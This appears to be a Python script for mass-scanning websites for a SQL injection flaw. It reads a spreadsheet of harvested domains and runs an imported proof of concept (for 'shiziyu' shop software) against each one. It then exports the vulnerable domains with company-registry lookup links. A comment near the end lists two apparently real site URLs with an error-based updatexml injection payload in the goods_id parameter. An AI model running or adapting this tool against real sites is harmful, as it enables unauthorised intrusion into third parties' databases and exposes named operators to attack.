import argparse
import re

import colorama
import  pandas  as pd
import requests
import xlsxwriter
import openpyxl
from script import shiziyu_sql

class test_sql:
    def test_file(filename):
            df = pd.read_excel(filename)
            sqltest = shiziyu_sql.shiziyu_sql
            result = ""
            count = 1
            for i in range(len(df)):
                    domain = str(df.iloc[i, 0])
                    if (str(domain) != "nan") and (str(sqltest.POC("www."+domain)) != "None"):
                            if count==1:
                                    result = str(sqltest.POC("www."+domain))
                                    count=2
                            else:
                                    result = result+"**"+str(sqltest.POC(domain))#"www."+domain
            #print("result:"+result)
            result=result.split("**")
            #print(result)
            return result

    def out_file_excel(filename,result1):
        column_lib = {1: 'A', 2: 'B', 3: 'C', 4: 'D', 5: 'E', 6: 'F', 7: 'G', 8: 'H', 9: 'I', 10: 'J', 11: 'K', 12: 'L',
                      13: 'M', 14: 'N', 15: 'O', 16: 'P', 17: 'Q', 18: 'R', 19: 'S', 20: 'T', 21: 'U', 22: 'V', 23: 'W',
                      24: 'X', 25: 'Y', 26: 'Z'}
        #在路径还没变之前读取下数据,防止因路径改变出bug
        df = pd.read_excel(filename)
        #filename="./result/"+sql.xlsx
        filename="./result_vul/"+filename[9:]
        workbook = xlsxwriter.Workbook(filename) #创建xlsx文件
        worksheet = workbook.add_worksheet() #在文件中添加一个sheet1
        field=["有漏洞的域名","公司信息"]
        worksheet.set_column('A:{}'.format(column_lib[len(field)]), 30)#写几个列,如A:D,就是设置A到D单元格,这些单元格宽度为30
        #设置样式
        title_format = workbook.add_format(
            {'font_size': 14, 'border': 1, 'bold': True, 'font_color': 'white', 'bg_color': '#4BACC6',
                 'align': 'center',
                 'valign': 'center', 'text_wrap': True})
        content_format = workbook.add_format({'border': 1, 'align': 'left', 'valign': 'vcenter', 'text_wrap': True})
        i = 1
        row = 1
        #第一行表头也就是ip,host等
        for column in field:
                worksheet.write('{}1'.format(column_lib[i]), column, title_format)#1控制在第一行
                i += 1
        for n in range(len(result1)):
            temp="https://icp.chinaz.com/"+str(df.iloc[n, 0])
            worksheet.write(row,0,result1[n],content_format)
            worksheet.write(row,1,temp, content_format)
            row = row + 1
        workbook.close()
        print(colorama.Fore.GREEN + "[+] 文档输出成功！文件路径为{}".format(filename))

    # parser = argparse.ArgumentParser(
    #         description="fofa采集工具")
    # parser.add_argument('-f', '--filename', help='需要测试的excel文件,在/result/下',default="./result/sql.xlsx")
    # #调用狮子鱼sql注入脚本中的poc
    # args = parser.parse_args()#print(args.query)
    # filename = args.filename

    #result1=test_file(filename)
    #result1=result1.split("**")

    # re1=['http://www.kaola88.cn/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)', 'http://www.gdlywh.com/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)']
